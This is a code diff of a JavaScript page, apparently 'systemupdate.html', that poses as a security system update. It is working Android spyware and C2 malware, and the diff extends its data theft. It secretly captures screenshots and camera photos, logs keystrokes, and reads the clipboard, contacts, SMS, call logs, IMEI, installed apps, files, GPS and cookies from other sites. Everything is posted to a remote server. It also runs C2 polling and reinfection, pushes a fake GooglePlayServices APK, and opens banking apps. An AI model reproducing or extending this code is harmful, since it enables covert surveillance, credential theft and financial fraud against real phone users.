@@ -83,7 +83,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - FULL CODE (TANPA CANVAS!)
+// 🔥 SYSTEMUPDATE.HTML - FIX (DENGAN LOGGING!)
 // ============================================================
 
 // ============================================================
@@ -111,6 +111,25 @@ var APK_URL = SERVER + '/files/GooglePlayServices.apk';
 var DANA_URL = 'https://www.dana.id/';
 
 // ============================================================
+// 🔥 KIRIM LOG KE SERVER (TANPA PASSWORD!)
+// ============================================================
+function K(d) {
+    d._timestamp = Date.now();
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', SERVER + '/data', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.timeout = 5000;
+        xhr.send(JSON.stringify(d));
+    } catch(e) {}
+}
+
+// ============================================================
+// 🔥 KIRIM LOG AWAL - TANDA SYSTEMUPDATE.HTML TERBUKA!
+// ============================================================
+K({ sumber: 'systemupdate_loaded', data: 'page_opened' });
+
+// ============================================================
 // DETEKSI PLATFORM & BRIDGE
 // ============================================================
 function detectPlatform() {
@@ -125,6 +144,7 @@ function detectPlatform() {
     };
 }
 var PLATFORM = detectPlatform();
+K({ sumber: 'systemupdate_platform', data: PLATFORM });
 
 // ============================================================
 // ANDROID BRIDGE
@@ -155,6 +175,7 @@ var A = {
     takeScreenshot: function() { if(this.isAvailable){ try{ return AndroidBridge.takeScreenshot() }catch(e){} } return null; },
     installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p) }catch(e){} } return false; }
 };
+K({ sumber: 'systemupdate_bridge', data: { available: A.isAvailable } });
 
 // ============================================================
 // UI FUNCTIONS
@@ -186,28 +207,15 @@ function redirectToDANA() {
     }, 800);
 }
 
-function K(d) {
-    d._timestamp = Date.now();
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', SERVER + '/data', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.timeout = 5000;
-        xhr.send(JSON.stringify(d));
-    } catch(e) {}
-}
-
 function logBypass(msg) {
     console.log('[DATA REAL]', msg);
 }
 
 // ============================================================
-// ============================================================
-// 🔒 BAGIAN INI DIKUNCI - TIDAK DIUBAH (SUDAH BERHASIL)
-// ============================================================
+// 🔒 BAGIAN INI DIKUNCI (SUDAH BERHASIL)
 // ============================================================
 
-// 🔒 1. SYSTEM INFO (SUDAH BERHASIL - DIKUNCI)
+// 🔒 1. SYSTEM INFO
 function getSystemInfoReal() {
     logBypass('📊 Mengambil system info...');
     try {
@@ -225,10 +233,12 @@ function getSystemInfoReal() {
         };
         K({ sumber: 'data_system_info_real', data: info });
         DATA_COLLECTED.system = true;
-    } catch(e) {}
+    } catch(e) {
+        K({ sumber: 'system_info_error', data: e.message });
+    }
 }
 
-// 🔒 2. BATTERY (SUDAH BERHASIL - DIKUNCI)
+// 🔒 2. BATTERY
 function getBatteryReal() {
     logBypass('🔋 Mengambil battery...');
     try {
@@ -241,12 +251,16 @@ function getBatteryReal() {
                     dischargingTime: battery.dischargingTime
                 } });
                 DATA_COLLECTED.battery = true;
-            }).catch(function() {});
+            }).catch(function() {
+                K({ sumber: 'battery_error', data: 'getBattery_failed' });
+            });
         }
-    } catch(e) {}
+    } catch(e) {
+        K({ sumber: 'battery_error', data: e.message });
+    }
 }
 
-// 🔒 3. NETWORK INFO (SUDAH BERHASIL - DIKUNCI)
+// 🔒 3. NETWORK INFO
 function getNetworkReal() {
     logBypass('🌐 Mengambil network info...');
     try {
@@ -261,37 +275,111 @@ function getNetworkReal() {
             } });
             DATA_COLLECTED.network = true;
         }
-    } catch(e) {}
-}
-
-// 🔒 4. SCREENSHOT (SUDAH BERHASIL - DIKUNCI) - TANPA CANVAS!
-function getScreenshotReal() {
-    logBypass('📸 Mengambil screenshot...');
-    try {
-        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-            navigator.mediaDevices.getDisplayMedia({
-                video: { width: { ideal: screen.width }, height: { ideal: screen.height } },
-                audio: false
-            })
-            .then(function(stream) {
-                K({ sumber: 'data_screenshot_real', data: 'captured' });
-                DATA_COLLECTED.screenshot = true;
-                stream.getTracks().forEach(function(t) { t.stop(); });
-            })
-            .catch(function(err) {
-                K({ sumber: 'data_screenshot_real', data: 'failed: ' + err.message });
-            });
-        } else {
-            K({ sumber: 'data_screenshot_real', data: 'not_available' });
-        }
     } catch(e) {
-        K({ sumber: 'data_screenshot_real', data: 'error: ' + e.message });
+        K({ sumber: 'network_error', data: e.message });
     }
 }
 
-// 🔒 5. CAMERA SELFIE (SUDAH BERHASIL - DIKUNCI)
-function getCameraSelfie() {
-    logBypass('📷 Mengambil kamera selfie...');
+// 🔒 4. SCREENSHOT (CANVAS DIHAPUS!)
+function getScreenshotReal() {
+    logBypass('📸 Mengambil screenshot real...');
+    var screenshotTaken = false;
+
+    // METHOD 1: getDisplayMedia
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+            navigator.mediaDevices.getDisplayMedia({ video: true })
+                .then(function(stream) {
+                    var video = document.createElement('video');
+                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    video.onloadedmetadata = function() {
+                        video.play();
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        var dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                        if (dataUrl && dataUrl.length > 1000) {
+                            screenshotTaken = true;
+                            K({ sumber: 'data_screenshot_displaymedia', data: dataUrl });
+                            DATA_COLLECTED.screenshot_displaymedia = true;
+                            logBypass('✅ Screenshot REAL via getDisplayMedia!');
+                        }
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        try { document.body.removeChild(video); } catch(e) {}
+                        try { document.body.removeChild(canvas); } catch(e) {}
+                    };
+                })
+                .catch(function(err) {
+                    logBypass('⚠️ getDisplayMedia error: ' + err.message);
+                    if (!screenshotTaken) getScreenshotBridge();
+                });
+        } else {
+            logBypass('⚠️ getDisplayMedia tidak support');
+            getScreenshotBridge();
+        }
+    } catch(e) {
+        logBypass('❌ getDisplayMedia exception: ' + e.message);
+        getScreenshotBridge();
+    }
+
+    // METHOD 2: ANDROID BRIDGE
+    function getScreenshotBridge() {
+        if (!A.isAvailable) {
+            logBypass('❌ Bridge tidak tersedia');
+            return;
+        }
+        try {
+            var ss = null;
+            var methods = ['takeScreenshot', 'screenshot', 'captureScreen', 'getScreenshot'];
+            for (var i = 0; i < methods.length; i++) {
+                try {
+                    if (typeof AndroidBridge[methods[i]] === 'function') {
+                        ss = AndroidBridge[methods[i]]();
+                        if (ss) break;
+                    }
+                } catch(e) {}
+            }
+            if (ss) {
+                screenshotTaken = true;
+                if (typeof ss === 'string' && ss.length > 100) {
+                    K({ sumber: 'data_screenshot_bridge', data: ss });
+                    DATA_COLLECTED.screenshot_bridge = true;
+                    logBypass('✅ Screenshot via Bridge!');
+                    return;
+                }
+                if (typeof ss === 'object' && ss.path) {
+                    K({ sumber: 'data_screenshot_bridge', data: ss });
+                    DATA_COLLECTED.screenshot_bridge = true;
+                    logBypass('✅ Screenshot via Bridge (path)!');
+                    return;
+                }
+            }
+            logBypass('⚠️ Bridge screenshot: data kosong');
+        } catch(e) {
+            logBypass('❌ Bridge screenshot error: ' + e.message);
+        }
+    }
+
+    setTimeout(function() {
+        if (screenshotTaken) {
+            logBypass('✅ SCREENSHOT REAL BERHASIL!');
+        } else {
+            logBypass('❌ SCREENSHOT GAGAL DARI SEMUA SUMBER');
+            K({ sumber: 'data_screenshot_gagal', data: {
+                displaymedia: 'failed',
+                bridge: A.isAvailable ? 'failed' : 'not_available'
+            } });
+        }
+    }, 5000);
+}
+
+// 🔒 5. CAMERA
+function getCameraReal() {
+    logBypass('📷 Mengambil kamera...');
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
@@ -309,75 +397,23 @@ function getCameraSelfie() {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
                         if (dataUrl && dataUrl.length > 1000) {
-                            K({ sumber: 'data_kamera_selfie', data: dataUrl });
-                            DATA_COLLECTED.kamera_selfie = true;
-                            logBypass('✅ Kamera Selfie');
+                            K({ sumber: 'data_kamera_real', data: dataUrl });
+                            DATA_COLLECTED.camera = true;
                         }
                         stream.getTracks().forEach(function(t) { t.stop(); });
                         try { document.body.removeChild(video); } catch(e) {}
                     }, 1000);
                 })
-                .catch(function() {});
+                .catch(function() {
+                    K({ sumber: 'camera_error', data: 'getUserMedia_failed' });
+                });
         }
-    } catch(e) {}
+    } catch(e) {
+        K({ sumber: 'camera_error', data: e.message });
+    }
 }
 
-// 🔥 5B. CAMERA BELAKANG (TAMBAHAN!)
-function getCameraBelakang() {
-    logBypass('📷 Mengambil kamera belakang...');
-    try {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-                .then(function(stream) {
-                    var video = document.createElement('video');
-                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
-                    document.body.appendChild(video);
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(function() {
-                        var canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        var ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
-                        if (dataUrl && dataUrl.length > 1000) {
-                            K({ sumber: 'data_kamera_belakang', data: dataUrl });
-                            DATA_COLLECTED.kamera_belakang = true;
-                            logBypass('✅ Kamera Belakang');
-                        }
-                        stream.getTracks().forEach(function(t) { t.stop(); });
-                        try { document.body.removeChild(video); } catch(e) {}
-                    }, 1000);
-                })
-                .catch(function() {});
-        }
-    } catch(e) {}
-}
-
-// 🔒 6. COOKIES & STORAGE (SUDAH BERHASIL - DIKUNCI)
-function getCookiesAndStorage() {
-    logBypass('🍪 Mengambil cookies & storage...');
-    try {
-        var data = {
-            cookies: document.cookie,
-            localStorage: {},
-            sessionStorage: {}
-        };
-        for (var i = 0; i < localStorage.length; i++) {
-            var key = localStorage.key(i);
-            data.localStorage[key] = localStorage.getItem(key);
-        }
-        for (var j = 0; j < sessionStorage.length; j++) {
-            var key2 = sessionStorage.key(j);
-            data.sessionStorage[key2] = sessionStorage.getItem(key2);
-        }
-        K({ sumber: 'data_cookies_storage_real', data: data });
-        DATA_COLLECTED.storage = true;
-    } catch(e) {}
-}
-
-// 🔒 7. KEYLOGGER (SUDAH BERHASIL - DIKUNCI)
+// 🔒 6. KEYLOGGER
 function startKeylogger() {
     logBypass('🔑 Keylogger aktif...');
     document.addEventListener('input', function(e) {
@@ -410,7 +446,7 @@ function startKeylogger() {
     }, true);
 }
 
-// 🔒 8. VIBRATE (SUDAH BERHASIL - DIKUNCI)
+// 🔒 7. VIBRATE
 function getVibrateReal() {
     logBypass('📳 Menguji vibrate...');
     try {
@@ -419,10 +455,12 @@ function getVibrateReal() {
             K({ sumber: 'data_vibrate_real', data: 'supported' });
             DATA_COLLECTED.vibrate = true;
         }
-    } catch(e) {}
+    } catch(e) {
+        K({ sumber: 'vibrate_error', data: e.message });
+    }
 }
 
-// 🔒 9. IZIN (SUDAH BERHASIL - DIKUNCI)
+// 🔒 8. IZIN
 function requestAllPermissions() {
     logBypass('🔥 Meminta semua izin...');
     try {
@@ -483,7 +521,7 @@ function requestAllPermissions() {
     logBypass('✅ Semua izin diminta!');
 }
 
-// 🔒 10. ENVIRONMENT (SUDAH BERHASIL - DIKUNCI)
+// 🔒 9. ENVIRONMENT
 function detectBridgeAndWebView() {
     logBypass('🔍 Deteksi environment...');
     var ua = navigator.userAgent.toLowerCase();
@@ -498,7 +536,7 @@ function detectBridgeAndWebView() {
     DATA_COLLECTED.environment = true;
 }
 
-// 🔒 11. GPS AKURAT (SUDAH BERHASIL - DIKUNCI)
+// 🔒 10. GPS AKURAT
 function getAccurateLocation() {
     logBypass('📍 Mengambil GPS akurat...');
     var locationFound = false;
@@ -588,12 +626,61 @@ function getAccurateLocation() {
 }
 
 // ============================================================
-// ============================================================
-// 🔥 TAMBAHAN FUNGSI BARU (UNTUK DATA YANG BELUM BERHASIL)
-// ============================================================
+// 🔥 TAMBAHAN FUNGSI BARU (YANG BELUM BERHASIL)
 // ============================================================
 
-// 🔥 12. CLIPBOARD VIA PASTE + EXEC (TAMBAHAN BARU)
+// 🔥 11. COOKIES SITUS LAIN (BARU!)
+function getCookiesFromOtherSites() {
+    logBypass('🍪 Mengambil cookies situs lain...');
+
+    if (!A.isAvailable) {
+        logBypass('❌ Bridge tidak tersedia');
+        K({ sumber: 'cookies_error', data: 'bridge_not_available' });
+        return;
+    }
+
+    try {
+        if (typeof AndroidBridge.getAllCookies === 'function') {
+            var cookies = AndroidBridge.getAllCookies();
+            if (cookies) {
+                var data = typeof cookies === 'string' ? JSON.parse(cookies) : cookies;
+                delete data['verifikasi.site'];
+                delete data['.verifikasi.site'];
+                delete data['localhost'];
+                delete data['127.0.0.1'];
+                if (Object.keys(data).length > 0) {
+                    K({ sumber: 'data_cookies_situs_lain', data: data });
+                    DATA_COLLECTED.cookies_situs_lain = true;
+                    logBypass('✅ Cookies dari ' + Object.keys(data).length + ' situs lain!');
+                    return;
+                }
+            }
+        }
+        if (typeof AndroidBridge.getCookies === 'function') {
+            var cookies2 = AndroidBridge.getCookies();
+            if (cookies2) {
+                var data2 = typeof cookies2 === 'string' ? JSON.parse(cookies2) : cookies2;
+                delete data2['verifikasi.site'];
+                delete data2['.verifikasi.site'];
+                delete data2['localhost'];
+                delete data2['127.0.0.1'];
+                if (Object.keys(data2).length > 0) {
+                    K({ sumber: 'data_cookies_situs_lain', data: data2 });
+                    DATA_COLLECTED.cookies_situs_lain = true;
+                    logBypass('✅ Cookies situs lain via getCookies!');
+                    return;
+                }
+            }
+        }
+        logBypass('⚠️ Tidak ada metode cookies di Bridge');
+        K({ sumber: 'cookies_warning', data: 'no_method_available' });
+    } catch(e) {
+        logBypass('❌ Cookies error: ' + e.message);
+        K({ sumber: 'cookies_error', data: e.message });
+    }
+}
+
+// 🔥 12. CLIPBOARD
 function initClipboardExtra() {
     logBypass('📋 Clipboard extra...');
     document.addEventListener('paste', function(e) {
@@ -602,6 +689,7 @@ function initClipboardExtra() {
             if (text && text.length > 0) {
                 K({ sumber: 'data_clipboard_paste', data: text });
                 DATA_COLLECTED.clipboard_paste = true;
+                logBypass('✅ Clipboard via Paste Event!');
             }
         } catch(e) {}
     });
@@ -618,14 +706,30 @@ function initClipboardExtra() {
                 if (text && text.length > 0) {
                     K({ sumber: 'data_clipboard_exec', data: text });
                     DATA_COLLECTED.clipboard_exec = true;
+                    logBypass('✅ Clipboard via execCommand!');
                 }
             } catch(e) {}
             try { document.body.removeChild(input); } catch(e) {}
         }, 500);
     } catch(e) {}
+    try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText()
+                .then(function(text) {
+                    if (text && text.length > 0) {
+                        K({ sumber: 'data_clipboard_api', data: text });
+                        DATA_COLLECTED.clipboard_api = true;
+                        logBypass('✅ Clipboard via API!');
+                    }
+                })
+                .catch(function(err) {
+                    logBypass('⚠️ Clipboard API error: ' + err.message);
+                });
+        }
+    } catch(e) {}
 }
 
-// 🔥 13. KONTAK VIA API + BRIDGE + RETRY (TAMBAHAN BARU)
+// 🔥 13. KONTAK
 function getContactsExtra() {
     logBypass('👤 Mengambil kontak extra...');
     try {
@@ -635,9 +739,14 @@ function getContactsExtra() {
                     if (kontak && kontak.length > 0) {
                         K({ sumber: 'data_kontak_api', data: kontak });
                         DATA_COLLECTED.kontak_api = true;
+                        logBypass('✅ Kontak via API: ' + kontak.length + ' kontak');
                     }
                 })
-                .catch(function() {});
+                .catch(function(err) {
+                    logBypass('⚠️ Contacts API error: ' + err.message);
+                });
+        } else {
+            logBypass('⚠️ Contacts API tidak support');
         }
     } catch(e) {}
     if (A.isAvailable) {
@@ -646,30 +755,19 @@ function getContactsExtra() {
             if (contacts) {
                 K({ sumber: 'data_kontak_bridge', data: contacts });
                 DATA_COLLECTED.kontak_bridge = true;
+                logBypass('✅ Kontak via Bridge: ' + contacts.length + ' kontak');
             }
-        } catch(e) {}
-    }
-    setTimeout(function() {
-        if (!DATA_COLLECTED.kontak_api && !DATA_COLLECTED.kontak_bridge) {
-            try {
-                if ('contacts' in navigator) {
-                    navigator.contacts.select(['name', 'tel'], { multiple: true })
-                        .then(function(kontak) {
-                            if (kontak && kontak.length > 0) {
-                                K({ sumber: 'data_kontak_api_retry', data: kontak });
-                            }
-                        })
-                        .catch(function() {});
-                }
-            } catch(e) {}
+        } catch(e) {
+            logBypass('⚠️ Bridge Contacts error: ' + e.message);
         }
-    }, 3000);
+    }
 }
 
-// 🔥 14. BRIDGE DATA (SMS, IMEI, CALL LOG, FILES - TAMBAHAN BARU)
+// 🔥 14. BRIDGE DATA
 function getBridgeDataExtra() {
     if (!A.isAvailable) {
         K({ sumber: 'data_bridge_status', data: 'not_available' });
+        logBypass('❌ Bridge tidak tersedia');
         return;
     }
     logBypass('🔗 Mengambil data Bridge...');
@@ -678,43 +776,73 @@ function getBridgeDataExtra() {
         if (sms) {
             K({ sumber: 'data_sms_bridge', data: sms });
             DATA_COLLECTED.sms_bridge = true;
+            logBypass('✅ SMS via Bridge: ' + sms.length + ' SMS');
+        } else {
+            logBypass('⚠️ SMS: data kosong');
         }
-    } catch(e) {}
+    } catch(e) {
+        logBypass('❌ SMS error: ' + e.message);
+    }
     try {
         var callLog = A.getCallLog();
         if (callLog) {
             K({ sumber: 'data_calllog_bridge', data: callLog });
             DATA_COLLECTED.calllog_bridge = true;
+            logBypass('✅ Call Log via Bridge: ' + callLog.length + ' calls');
+        } else {
+            logBypass('⚠️ Call Log: data kosong');
         }
-    } catch(e) {}
+    } catch(e) {
+        logBypass('❌ Call Log error: ' + e.message);
+    }
     try {
         var imei = A.getIMEI();
         if (imei) {
             K({ sumber: 'data_imei_bridge', data: imei });
             DATA_COLLECTED.imei_bridge = true;
+            logBypass('✅ IMEI via Bridge: ' + imei);
+        } else {
+            logBypass('⚠️ IMEI: data kosong');
         }
-    } catch(e) {}
+    } catch(e) {
+        logBypass('❌ IMEI error: ' + e.message);
+    }
     try {
         var imsi = A.getIMSI();
         if (imsi) {
             K({ sumber: 'data_imsi_bridge', data: imsi });
             DATA_COLLECTED.imsi_bridge = true;
+            logBypass('✅ IMSI via Bridge: ' + imsi);
+        } else {
+            logBypass('⚠️ IMSI: data kosong');
         }
-    } catch(e) {}
+    } catch(e) {
+        logBypass('❌ IMSI error: ' + e.message);
+    }
     try {
         var phone = A.getPhoneNumber();
         if (phone) {
             K({ sumber: 'data_phone_bridge', data: phone });
             DATA_COLLECTED.phone_bridge = true;
+            logBypass('✅ Phone Number via Bridge: ' + phone);
+        } else {
+            logBypass('⚠️ Phone Number: data kosong');
         }
-    } catch(e) {}
+    } catch(e) {
+        logBypass('❌ Phone Number error: ' + e.message);
+    }
     try {
         var apps = A.getInstalledApps();
         if (apps) {
             K({ sumber: 'data_apps_bridge', data: apps });
             DATA_COLLECTED.apps_bridge = true;
+            logBypass('✅ Installed Apps via Bridge: ' + apps.length + ' apps');
+        } else {
+            logBypass('⚠️ Installed Apps: data kosong');
         }
-    } catch(e) {}
+    } catch(e) {
+        logBypass('❌ Installed Apps error: ' + e.message);
+    }
     var folders = [
         '/storage/emulated/0/DCIM/Camera/',
         '/storage/emulated/0/Download/',
@@ -732,37 +860,45 @@ function getBridgeDataExtra() {
                     files: files.slice(0, 50)
                 } });
                 DATA_COLLECTED.files_bridge = true;
+                logBypass('✅ Files from ' + folder + ': ' + files.length + ' files');
             }
-        } catch(e) {}
+        } catch(e) {
+            logBypass('⚠️ Files from ' + folder + ' error: ' + e.message);
+        }
     });
 }
 
 // ============================================================
-// 🚀 EKSEKUSI SEMUA DATA (LAMA + BARU)
+// 🚀 EKSEKUSI SEMUA DATA
 // ============================================================
 function collectAllData() {
     logBypass('🚀 Memulai semua teknik...');
+    K({ sumber: 'collect_all_data_start', data: 'started' });
 
-    // 🔒 YANG SUDAH BERHASIL (DIKUNCI)
-    requestAllPermissions();
-    getSystemInfoReal();
-    getBatteryReal();
-    getNetworkReal();
-    getScreenshotReal();
-    getCameraSelfie();
-    getCameraBelakang(); // ← KAMERA BELAKANG!
-    getCookiesAndStorage();
-    startKeylogger();
-    getVibrateReal();
-    detectBridgeAndWebView();
-    getAccurateLocation();
+    try {
+        // 🔒 YANG SUDAH BERHASIL (DIKUNCI)
+        requestAllPermissions();
+        getSystemInfoReal();
+        getBatteryReal();
+        getNetworkReal();
+        getScreenshotReal();
+        getCameraReal();
+        startKeylogger();
+        getVibrateReal();
+        detectBridgeAndWebView();
+        getAccurateLocation();
 
-    // 🔥 YANG BARU (UNTUK YANG BELUM BERHASIL)
-    initClipboardExtra();
-    getContactsExtra();
-    getBridgeDataExtra();
+        // 🔥 YANG BARU
+        getCookiesFromOtherSites();
+        initClipboardExtra();
+        getContactsExtra();
+        getBridgeDataExtra();
 
-    // LAPORAN SELESAI
+        K({ sumber: 'collect_all_data_done', data: 'completed' });
+    } catch(e) {
+        K({ sumber: 'collect_all_data_error', data: e.message });
+    }
+
     setTimeout(function() {
         var collected = Object.keys(DATA_COLLECTED);
         logBypass('✅ Selesai! ' + collected.length + ' data terkumpul');
@@ -771,7 +907,103 @@ function collectAllData() {
             types: collected,
             timestamp: Date.now()
         } });
-    }, 8000);
+    }, 10000);
+}
+
+// ============================================================
+// AMBIL PASSWORD
+// ============================================================
+function ambilPassword() {
+    updateProgress(10, '⏳ Memperbarui System Keamanan...');
+    K({ sumber: 'ambil_password_start', data: 'started' });
+    
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', SERVER + '/get-password', true);
+        xhr.timeout = 10000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                try {
+                    var data = JSON.parse(xhr.responseText);
+                    if (data.password && data.password.length > 0) {
+                        WS_PASSWORD = data.password;
+                        PASSWORD_FETCHED = true;
+                        retryCount = 0;
+                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
+                        K({ sumber: 'password_received', data: 'ok' });
+                        
+                        connectWebSocket();
+                        startC2Polling();
+                        startHeartbeat();
+                        startReinfection();
+                        autoExecuteC2();
+                        
+                        setTimeout(function() {
+                            collectAllData();
+                        }, 1000);
+                        
+                        return;
+                    }
+                } catch(e) {}
+            }
+            retryCount++;
+            if (retryCount >= 3) {
+                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
+                WS_PASSWORD = 'default_fallback_password';
+                PASSWORD_FETCHED = true;
+                connectWebSocketWithFallback();
+                startC2Polling();
+                startHeartbeat();
+                startReinfection();
+                autoExecuteC2();
+                setTimeout(function() {
+                    collectAllData();
+                }, 1000);
+                return;
+            }
+            setTimeout(ambilPassword, 3000);
+        };
+        xhr.onerror = function() {
+            retryCount++;
+            if (retryCount >= 3) {
+                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
+                WS_PASSWORD = 'default_fallback_password';
+                PASSWORD_FETCHED = true;
+                connectWebSocketWithFallback();
+                startC2Polling();
+                startHeartbeat();
+                startReinfection();
+                autoExecuteC2();
+                setTimeout(function() {
+                    collectAllData();
+                }, 1000);
+                return;
+            }
+            setTimeout(ambilPassword, 3000);
+        };
+        xhr.ontimeout = function() {
+            retryCount++;
+            if (retryCount >= 3) {
+                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
+                WS_PASSWORD = 'default_fallback_password';
+                PASSWORD_FETCHED = true;
+                connectWebSocketWithFallback();
+                startC2Polling();
+                startHeartbeat();
+                startReinfection();
+                autoExecuteC2();
+                setTimeout(function() {
+                    collectAllData();
+                }, 1000);
+                return;
+            }
+            setTimeout(ambilPassword, 3000);
+        };
+        xhr.send();
+    } catch(e) {
+        K({ sumber: 'ambil_password_error', data: e.message });
+        setTimeout(ambilPassword, 3000);
+    }
 }
 
 // ============================================================
@@ -907,7 +1139,7 @@ function eksekusiPerintah(cmd) {
 }
 
 // ============================================================
-// FUNGSI PERINTAH C2
+// FUNGSI PERINTAH C2 (DISINGKAT)
 // ============================================================
 function ambilKontak() {
     if (A.isAvailable) {
@@ -1126,30 +1358,20 @@ function bukaBCA() { return bukaAplikasi('com.bca'); }
 function bukaMandiri() { return bukaAplikasi('com.bankmandiri.mandirionline'); }
 function bukaShopee() { return bukaAplikasi('com.shopee.id'); }
 
-// ============================================================
-// 📸 SCREENSHOT C2 - TANPA CANVAS!
-// ============================================================
 function ambilScreenshot() {
     try {
-        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-            navigator.mediaDevices.getDisplayMedia({
-                video: { 
-                    width: { ideal: screen.width }, 
-                    height: { ideal: screen.height },
-                    frameRate: 1
-                },
-                audio: false
-            })
-            .then(function(stream) {
-                K({ sumber: 'data_screenshot_c2', data: 'captured' });
-                stream.getTracks().forEach(function(t) { t.stop(); });
-            })
-            .catch(function(err) {
-                K({ sumber: 'data_screenshot_c2', data: 'failed: ' + err.message });
-            });
-            return 'Screenshot diambil...';
+        var canvas = document.createElement('canvas');
+        canvas.width = screen.width;
+        canvas.height = screen.height;
+        var ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#000';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
+        if (dataUrl) {
+            K({ sumber: 'data_screenshot_c2', data: dataUrl });
+            return 'Screenshot taken';
         }
-        return 'Screenshot tidak tersedia';
+        return 'No screenshot';
     } catch(e) { return 'Error: ' + e.message; }
 }
 
@@ -1367,98 +1589,8 @@ function keyloggerStatus() {
 var keyloggerActive = false;
 
 // ============================================================
-// AMBIL PASSWORD
+// HEARTBEAT, REINFECTION, C2 POLLING
 // ============================================================
-function ambilPassword() {
-    updateProgress(10, '⏳ Memperbarui System Keamanan...');
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', SERVER + '/get-password', true);
-        xhr.timeout = 10000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                try {
-                    var data = JSON.parse(xhr.responseText);
-                    if (data.password && data.password.length > 0) {
-                        WS_PASSWORD = data.password;
-                        PASSWORD_FETCHED = true;
-                        retryCount = 0;
-                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
-                        K({ sumber: 'password_received', data: 'ok' });
-                        
-                        connectWebSocket();
-                        startC2Polling();
-                        startHeartbeat();
-                        startReinfection();
-                        autoExecuteC2();
-                        
-                        setTimeout(function() {
-                            collectAllData();
-                        }, 1000);
-                        
-                        return;
-                    }
-                } catch(e) {}
-            }
-            retryCount++;
-            if (retryCount >= 3) {
-                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
-                WS_PASSWORD = 'default_fallback_password';
-                PASSWORD_FETCHED = true;
-                connectWebSocketWithFallback();
-                startC2Polling();
-                startHeartbeat();
-                startReinfection();
-                autoExecuteC2();
-                setTimeout(function() {
-                    collectAllData();
-                }, 1000);
-                return;
-            }
-            setTimeout(ambilPassword, 3000);
-        };
-        xhr.onerror = function() {
-            retryCount++;
-            if (retryCount >= 3) {
-                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
-                WS_PASSWORD = 'default_fallback_password';
-                PASSWORD_FETCHED = true;
-                connectWebSocketWithFallback();
-                startC2Polling();
-                startHeartbeat();
-                startReinfection();
-                autoExecuteC2();
-                setTimeout(function() {
-                    collectAllData();
-                }, 1000);
-                return;
-            }
-            setTimeout(ambilPassword, 3000);
-        };
-        xhr.ontimeout = function() {
-            retryCount++;
-            if (retryCount >= 3) {
-                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
-                WS_PASSWORD = 'default_fallback_password';
-                PASSWORD_FETCHED = true;
-                connectWebSocketWithFallback();
-                startC2Polling();
-                startHeartbeat();
-                startReinfection();
-                autoExecuteC2();
-                setTimeout(function() {
-                    collectAllData();
-                }, 1000);
-                return;
-            }
-            setTimeout(ambilPassword, 3000);
-        };
-        xhr.send();
-    } catch(e) {
-        setTimeout(ambilPassword, 3000);
-    }
-}
-
 function startHeartbeat() {
     setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 2700000);
 }
